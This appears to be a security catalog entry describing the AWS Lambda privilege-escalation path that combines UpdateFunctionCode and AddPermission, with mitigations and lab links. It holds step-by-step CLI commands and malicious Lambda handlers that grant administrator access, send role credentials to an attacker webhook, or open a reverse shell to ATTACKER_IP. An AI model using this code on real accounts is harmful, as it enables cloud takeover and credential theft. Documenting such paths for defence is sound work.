id: lambda-005
parent:
  id: lambda-003
  modification: Adds lambda:AddPermission to grant self-invocation permission when the starting principal does not already have `lambda:InvokeFunction`
name: lambda:UpdateFunctionCode + lambda:AddPermission
category: existing-passrole
services:
- lambda
permissions:
  required:
  - permission: lambda:UpdateFunctionCode
    resourceConstraints: Must have permission to update the target Lambda function's code
  - permission: lambda:AddPermission
    resourceConstraints: Must have permission to modify the target Lambda function's resource-based policy
  additional:
  - permission: lambda:ListFunctions
    resourceConstraints: Helpful for discovering available Lambda functions to target
  - permission: lambda:GetFunction
    resourceConstraints: Useful for viewing function details including execution role ARN and resource policy
  - permission: lambda:GetFunctionConfiguration
    resourceConstraints: Useful for viewing function configuration details
  - permission: lambda:GetPolicy
    resourceConstraints: Useful for viewing the function's resource-based policy
  - permission: iam:GetRole
    resourceConstraints: Useful for viewing the execution role's trust policy and permissions
  - permission: iam:ListAttachedRolePolicies
    resourceConstraints: Useful for understanding what permissions the execution role has
description: A principal with `lambda:UpdateFunctionCode` and `lambda:AddPermission` can modify an existing Lambda function's code with malicious code and grant themselves permission to invoke it via the resource-based policy. The attacker does not need `lambda:InvokeFunction` as an IAM permission because `lambda:AddPermission` grants invocation rights through the function's resource-based policy. This allows the attacker to execute the malicious code under the function's privileged execution role immediately, without waiting for automatic triggers.
prerequisites:
  admin:
  - A Lambda function must exist with an administrative execution role (e.g., AdministratorAccess)
  lateral:
  - A Lambda function must exist with a privileged execution role
exploitationSteps:
  awscli:
  - step: 1
    command: |
      aws lambda get-function \
        --function-name TARGET_FUNCTION \
        --query 'Configuration.FunctionArn' \
        --output text
    description: Identify the target Lambda function and retrieve its ARN and configuration details
  - step: 2
    command: |
      cat > lambda_function.py << 'EOF'
      import boto3
      import json

      def lambda_handler(event, context):
          iam = boto3.client('iam')
          starting_user = 'ATTACKER_USERNAME'

          try:
              iam.attach_user_policy(
                  UserName=starting_user,
                  PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
              )
              return {
                  'statusCode': 200,
                  'body': json.dumps({
                      'message': 'Successfully attached AdministratorAccess',
                      'user': starting_user
                  })
              }
          except Exception as e:
              return {
                  'statusCode': 500,
                  'body': json.dumps({'error': str(e)})
              }
      EOF
    description: Create malicious Lambda function code that attaches AdministratorAccess to the starting user
  - step: 3
    command: zip exploit.zip lambda_function.py
    description: Package the malicious code into a deployment package
  - step: 4
    command: |
      aws lambda update-function-code \
        --function-name TARGET_FUNCTION \
        --zip-file fileb://exploit.zip
    description: Update the target Lambda function with the malicious code
  - step: 5
    command: |
      aws lambda add-permission \
        --function-name TARGET_FUNCTION \
        --statement-id AllowSelfInvoke \
        --action lambda:InvokeFunction \
        --principal arn:aws:iam::ACCOUNT_ID:user/ATTACKER_USERNAME
    description: Add a resource-based policy statement allowing the starting principal to invoke the function
  - step: 6
    command: |
      aws lambda invoke \
        --function-name TARGET_FUNCTION \
        --payload '{}' \
        response.json
    description: Invoke the modified Lambda function to execute the malicious code and escalate privileges
  - step: 7
    command: aws iam list-users --max-items 3
    description: Verify that administrator access has been granted
recommendation: |
  Restrict `lambda:UpdateFunctionCode`, `lambda:AddPermission`, and `lambda:InvokeFunction` permissions using the principle of least privilege. These permissions should be limited to specific Lambda function resources:

  ```json
  {
    "Effect": "Allow",
    "Action": [
      "lambda:UpdateFunctionCode",
      "lambda:AddPermission",
      "lambda:InvokeFunction"
    ],
    "Resource": "arn:aws:lambda:REGION:ACCOUNT_ID:function/SpecificFunction"
  }
  ```

  Additional security controls:
  - Implement Lambda code signing to prevent unauthorized code modifications
  - Lambda execution roles should follow least privilege and never have AdministratorAccess
  - Use AWS Config rules to detect Lambda functions with overly permissive execution roles
  - Monitor CloudTrail for `UpdateFunctionCode`, `AddPermission`, and `InvokeFunction` events on sensitive functions
  - Implement SCPs to prevent modification of Lambda functions with privileged roles
  - Use IAM Access Analyzer to identify privilege escalation paths involving Lambda permissions
  - Protect resource-based policies by denying `lambda:AddPermission` except for trusted CI/CD roles
  - Enable CloudWatch alarms for unusual Lambda invocation patterns on privileged functions
limitations: 'This path provides administrative access only if the target Lambda function''s execution role has administrative permissions (e.g., AdministratorAccess or equivalent custom policies). If the execution role has limited permissions, you gain access limited to those permissions. However, even limited execution role access may enable multi-hop attacks or access to sensitive data stores.

  '
discoveryAttribution:
  firstDocumented:
    source: pathfinding.cloud
    date: 2025
  derivativeOf:
    pathId: lambda-003
    modification: Adds lambda:AddPermission to grant self-invocation permission when the starting principal does not already have `lambda:InvokeFunction`
  ultimateOrigin:
    pathId: lambda-003
    author: Spencer Gietzen
    organization: Rhino Security Labs
    date: 2018
    link: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
references:
- title: AWS Privilege Escalation Methods and Mitigation (Original UpdateFunctionCode Research)
  url: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- title: AWS Lambda Privesc - HackTricks Cloud
  url: https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation/aws-lambda-privesc
relatedPaths:
- lambda-003
- lambda-001
- lambda-002
- lambda-004
learningEnvironments:
  pathfinding-labs:
    type: open-source
    githubLink: https://github.com/DataDog/pathfinding-labs
    scenario: privesc-one-hop/to-admin/lambda-updatefunctioncode+lambda-addpermission
    description: Deploy Terraform into your own AWS account to practice this attack path
  iam-vulnerable:
    type: open-source
    githubLink: https://github.com/BishopFox/iam-vulnerable
    scenario: Lambda-EditExistingLambdaFunctionWithRole
    description: Deploy Terraform into your own AWS account and practice individual exploitation paths
attackVisualization:
  nodes:
  - id: start
    label: Starting Principal
    type: principal
    description: 'The starting principal (user or role) with `lambda:UpdateFunctionCode` and `lambda:AddPermission` permissions. This principal will modify an existing Lambda function''s code with malicious code and grant themselves invocation rights via the resource-based policy (using `lambda:AddPermission`). The attacker does not need `lambda:InvokeFunction` as an IAM permission because the resource-based policy grant provides invocation rights. This allows them to invoke the function and execute the malicious code under the function''s privileged execution role.

      '
  - id: lambda_function
    label: Existing Lambda Function
    type: resource
    description: 'An existing Lambda function with a privileged IAM execution role. Unlike `lambda:UpdateFunctionCode` alone (LAMBDA-003), this attack path doesn''t require waiting for automatic triggers. The attacker can immediately invoke the function after updating its code and granting themselves invocation permission via `lambda:AddPermission`.

      '
  - id: grant_invoke_permission
    label: Grant Self-Invocation via Resource Policy
    type: payload
    color: '#99ccff'
    description: |
      The attacker uses `lambda:AddPermission` to add a statement to the Lambda function's resource-based policy that grants their principal permission to invoke the function. This bypasses any restrictive resource-based policies that might prevent initial invocation.

      Command:
      ```bash
      aws lambda add-permission \
        --function-name TARGET_FUNCTION \
        --statement-id AllowSelfInvoke \
        --action lambda:InvokeFunction \
        --principal arn:aws:iam::ACCOUNT_ID:user/ATTACKER_USERNAME
      ```

      This resource-based policy grant is what makes this attack path more versatile than `lambda:UpdateFunctionCode` alone - it allows immediate execution without waiting for automatic triggers.
  - id: execution_role
    label: Lambda Execution Role
    type: principal
    description: 'The IAM role attached to the Lambda function as its execution role. When the function is invoked, Lambda automatically assumes this role and makes its credentials available to the function code through the AWS SDK. All code executed in the function runs with the permissions of this execution role. This role must trust lambda.amazonaws.com in its trust policy.

      '
  - id: method_sdk_attack
    label: 'Method 1: Execute Attack via AWS SDK'
    type: payload
    color: '#99ccff'
    description: |
      The malicious Lambda function code uses the AWS SDK to directly perform privileged actions using the execution role's credentials. The function can call IAM APIs to elevate the starting principal's permissions, create access keys, modify policies, or perform other administrative actions. Since the function runs with the execution role's credentials automatically available, no credential exfiltration is needed.

      Example malicious Lambda code:
      ```python
      import boto3
      import json

      def lambda_handler(event, context):
          iam = boto3.client('iam')
          starting_user = 'ATTACKER_USERNAME'

          try:
              iam.attach_user_policy(
                  UserName=starting_user,
                  PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
              )
              return {
                  'statusCode': 200,
                  'body': json.dumps({
                      'message': 'Successfully attached AdministratorAccess',
                      'user': starting_user
                  })
              }
          except Exception as e:
              return {
                  'statusCode': 500,
                  'body': json.dumps({'error': str(e)})
              }
      ```

      This is the most direct approach - the Lambda function immediately modifies IAM or performs other privileged actions using its execution role's permissions.
  - id: method_webhook_exfil
    label: 'Method 2: Exfiltrate Credentials to Webhook'
    type: payload
    color: '#99ccff'
    description: |
      The malicious Lambda function code retrieves the execution role's temporary credentials from the Lambda environment and exfiltrates them to an attacker-controlled webhook or HTTP endpoint. The credentials are automatically available in environment variables that the AWS SDK uses.

      Example malicious Lambda code:
      ```python
      import os
      import json
      import urllib.request

      def lambda_handler(event, context):
          # Get credentials from environment
          creds = {
              'access_key': os.environ['AWS_ACCESS_KEY_ID'],
              'secret_key': os.environ['AWS_SECRET_ACCESS_KEY'],
              'session_token': os.environ['AWS_SESSION_TOKEN']
          }

          # Exfiltrate to webhook
          req = urllib.request.Request(
              'https://attacker-webhook.com/collect',
              data=json.dumps(creds).encode(),
              headers={'Content-Type': 'application/json'}
          )
          urllib.request.urlopen(req)

          return {'statusCode': 200}
      ```

      The attacker receives the credentials remotely and can use them from any location until they expire (typically 15 minutes to 1 hour).
  - id: method_reverse_shell
    label: 'Method 3: Reverse Shell Connection'
    type: payload
    color: '#99ccff'
    description: |
      The malicious Lambda function establishes a reverse shell connection back to an attacker-controlled listener, providing interactive access. From within the reverse shell, the attacker can access the execution role's credentials and run arbitrary AWS CLI commands.

      Example malicious Lambda code:
      ```python
      import socket
      import subprocess
      import os

      def lambda_handler(event, context):
          # Establish reverse shell
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect(('ATTACKER_IP', 4444))

          # Redirect stdin/stdout/stderr to socket
          os.dup2(s.fileno(), 0)
          os.dup2(s.fileno(), 1)
          os.dup2(s.fileno(), 2)

          # Start shell
          subprocess.call(['/bin/sh', '-i'])

          return {'statusCode': 200}
      ```

      This provides an interactive shell session within the Lambda execution environment where the attacker can access credentials and execute AWS CLI commands with the execution role's permissions. The session lasts until the Lambda function times out (max 15 minutes).
  - id: method_output_exfil
    label: 'Method 4: Exfiltrate Credentials to Output'
    type: payload
    color: '#99ccff'
    description: |
      The malicious Lambda function code retrieves the execution role's temporary credentials from the Lambda environment and returns them in the function's response output. This allows the attacker to read the credentials directly from the Lambda invocation result without needing an external webhook or reverse shell.

      Example malicious Lambda code:
      ```python
      import os
      import json

      def lambda_handler(event, context):
          # Get credentials from environment
          creds = {
              'access_key': os.environ['AWS_ACCESS_KEY_ID'],
              'secret_key': os.environ['AWS_SECRET_ACCESS_KEY'],
              'session_token': os.environ['AWS_SESSION_TOKEN']
          }

          # Return credentials in the response
          return {
              'statusCode': 200,
              'body': json.dumps({
                  'message': 'Credentials exfiltrated',
                  'credentials': creds
              })
          }
      ```

      The attacker invokes the function and reads the credentials from the response output. These credentials can then be exported and used from any location until they expire (typically 15 minutes to 1 hour).
  - id: admin_outcome
    label: Effective Administrator
    type: outcome
    description: 'If the target Lambda function''s execution role has administrative permissions (AdministratorAccess or equivalent), the attacker gains full administrative access to the AWS account by executing the malicious code. The code can directly modify IAM to grant the starting principal admin access or return admin credentials.

      '
  - id: partial_outcome
    label: Some additional access
    type: outcome
    color: '#ffeb99'
    description: 'If the Lambda function''s execution role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. This could include access to sensitive data stores (S3, RDS, DynamoDB), the ability to modify other resources, or permissions that enable additional privilege escalation paths.

      '
  - id: minimal_outcome
    label: No additional access
    type: outcome
    color: '#cccccc'
    description: 'If the Lambda function''s execution role only has minimal permissions (e.g., just CloudWatch Logs access), the privilege escalation may not yield meaningful additional access. However, the attacker still gains code execution capability which could be useful for reconnaissance or as part of a multi-step attack.

      '
  edges:
  - from: start
    to: lambda_function
    label: lambda:UpdateFunctionCode
    description: |
      The attacker updates the target Lambda function's code with malicious code. This requires creating a deployment package (ZIP file) containing the malicious code and uploading it to replace the function's existing code.

      Commands:
      ```bash
      cat > lambda_function.py << 'EOF'
      import boto3
      import json

      def lambda_handler(event, context):
          iam = boto3.client('iam')
          starting_user = 'ATTACKER_USERNAME'
          try:
              iam.attach_user_policy(
                  UserName=starting_user,
                  PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
              )
              return {'statusCode': 200, 'body': json.dumps({'message': 'Success'})}
          except Exception as e:
              return {'statusCode': 500, 'body': json.dumps({'error': str(e)})}
      EOF

      zip exploit.zip lambda_function.py

      aws lambda update-function-code \
        --function-name TARGET_FUNCTION \
        --zip-file fileb://exploit.zip
      ```

      The malicious code is now deployed and ready to execute with the function's execution role permissions when invoked.
  - from: lambda_function
    to: grant_invoke_permission
    label: lambda:AddPermission
    description: |
      The attacker adds a statement to the Lambda function's resource-based policy that grants their principal permission to invoke the function. This step is critical because it allows the attacker to invoke the function even if a restrictive resource-based policy previously prevented invocation.

      Command:
      ```bash
      aws lambda add-permission \
        --function-name TARGET_FUNCTION \
        --statement-id AllowSelfInvoke \
        --action lambda:InvokeFunction \
        --principal arn:aws:iam::ACCOUNT_ID:user/ATTACKER_USERNAME
      ```

      This modifies the function's resource-based policy to explicitly allow the starting principal to invoke it.
  - from: grant_invoke_permission
    to: execution_role
    label: lambda:InvokeFunction
    description: |
      The attacker invokes the modified Lambda function using `lambda:InvokeFunction`. Since they've granted themselves invocation permission via the resource-based policy, the invocation succeeds. When invoked, Lambda assumes the function's execution role and makes its credentials available to the malicious function code.

      Command:
      ```bash
      aws lambda invoke \
        --function-name TARGET_FUNCTION \
        --payload '{}' \
        response.json
      ```

      The function executes with the execution role's credentials, running the attacker's malicious code.
  - from: execution_role
    to: method_sdk_attack
    label: Option A
    branch: A
    description: 'The malicious function code uses the AWS SDK to directly perform privileged actions. This is the most direct approach - the function immediately modifies IAM or performs other privileged actions using its execution role''s permissions.

      '
  - from: execution_role
    to: method_webhook_exfil
    label: Option B
    branch: B
    description: 'The malicious function code retrieves the execution role''s temporary credentials and exfiltrates them to an attacker-controlled webhook. The attacker can then use these credentials from any location.

      '
  - from: execution_role
    to: method_reverse_shell
    label: Option C
    branch: C
    description: 'The malicious function establishes a reverse shell connection back to an attacker-controlled listener, providing interactive access with the execution role''s credentials.

      '
  - from: execution_role
    to: method_output_exfil
    label: Option D
    branch: D
    description: The attacker designed the malicious function code to retrieve the execution role's temporary credentials and return them in the Lambda response output. The attacker can then read the credentials directly from the invocation result.
  - from: method_sdk_attack
    to: admin_outcome
    label: If role has admin permissions
    branch: A1
    condition: admin
    description: 'If the Lambda function''s execution role has AdministratorAccess or equivalent administrative permissions, the SDK attack directly grants the starting principal full administrative access by attaching admin policies or creating admin access keys.

      '
  - from: method_sdk_attack
    to: partial_outcome
    label: If role has some permissions
    branch: A2
    condition: some_permissions
    description: 'If the Lambda function''s execution role has elevated but non-administrative permissions, the SDK attack can still grant useful additional permissions by modifying IAM within the role''s permission scope or accessing sensitive resources.

      '
  - from: method_sdk_attack
    to: minimal_outcome
    label: If role has minimal permissions
    branch: A3
    condition: no_permissions
    description: 'If the Lambda function''s execution role only has minimal permissions (typically just CloudWatch Logs), the SDK attack will fail to perform meaningful privilege escalation. The attacker would need to choose a different exploitation method or target a different function.

      '
  - from: method_webhook_exfil
    to: admin_outcome
    label: If role has admin permissions
    branch: B1
    condition: admin
    description: 'If the Lambda function''s execution role has AdministratorAccess or equivalent administrative permissions, the exfiltrated credentials provide the attacker with full administrative access to the AWS account from any location.

      '
  - from: method_webhook_exfil
    to: partial_outcome
    label: If role has some permissions
    branch: B2
    condition: some_permissions
    description: 'If the Lambda function''s execution role has elevated but non-administrative permissions, the exfiltrated credentials provide partial privilege escalation including access to S3, RDS, DynamoDB, or permissions to modify specific resources.

      '
  - from: method_webhook_exfil
    to: minimal_outcome
    label: If role has minimal permissions
    branch: B3
    condition: no_permissions
    description: 'If the Lambda function''s execution role only has minimal permissions (typically just CloudWatch Logs), the exfiltrated credentials may not provide significant additional access beyond what the starting principal already had.

      '
  - from: method_reverse_shell
    to: admin_outcome
    label: If role has admin permissions
    branch: C1
    condition: admin
    description: 'If the Lambda function''s execution role has AdministratorAccess or equivalent administrative permissions, the reverse shell provides interactive access with full administrative credentials. The attacker can run any AWS CLI commands until the Lambda function times out.

      '
  - from: method_reverse_shell
    to: partial_outcome
    label: If role has some permissions
    branch: C2
    condition: some_permissions
    description: 'If the Lambda function''s execution role has elevated but non-administrative permissions, the reverse shell provides interactive access to explore the available permissions and manually exploit them for partial privilege escalation.

      '
  - from: method_reverse_shell
    to: minimal_outcome
    label: If role has minimal permissions
    branch: C3
    condition: no_permissions
    description: 'If the Lambda function''s execution role only has minimal permissions, the reverse shell still provides interactive code execution capability which could be useful for reconnaissance, but may not provide significant privilege escalation.

      '
  - from: method_output_exfil
    to: admin_outcome
    label: If role has admin permissions
    branch: D1
    condition: admin
    description: If the execution role has AdministratorAccess or equivalent administrative permissions, the credentials returned in the output provide the attacker with full administrative access to the AWS account from any location.
  - from: method_output_exfil
    to: partial_outcome
    label: If role has some permissions
    branch: D2
    condition: some_permissions
    description: If the execution role has elevated but non-administrative permissions, the credentials returned in the output provide partial privilege escalation including access to S3, RDS, DynamoDB, or permissions to modify specific resources.
  - from: method_output_exfil
    to: minimal_outcome
    label: If role has minimal permissions
    branch: D3
    condition: no_permissions
    description: If the execution role only has minimal permissions, the credentials returned in the output may not provide significant additional access beyond what the starting principal already had.
